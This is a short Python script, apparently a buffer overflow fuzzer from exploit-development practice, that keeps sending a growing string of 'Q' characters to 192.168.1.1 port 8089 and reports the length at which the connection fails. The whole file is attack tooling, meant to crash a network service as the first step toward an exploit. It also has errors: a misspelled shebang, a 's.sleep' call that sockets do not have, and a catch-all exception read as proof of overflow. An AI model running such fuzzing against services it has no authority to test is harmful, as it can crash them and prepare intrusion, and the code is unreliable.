#!/bin/pyhton
import sys,socket
from time import sleep

buffer = "Q" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.1.1',8089))
		s.send(('Hi buddy'+ buffer))
		s.close()
		s.sleep(1)
		buffer = buffer + ("Q" * 100)
	
	except:
		print("The buffer overflow occured at " + str(len(buffer)))
		sys.exit()	
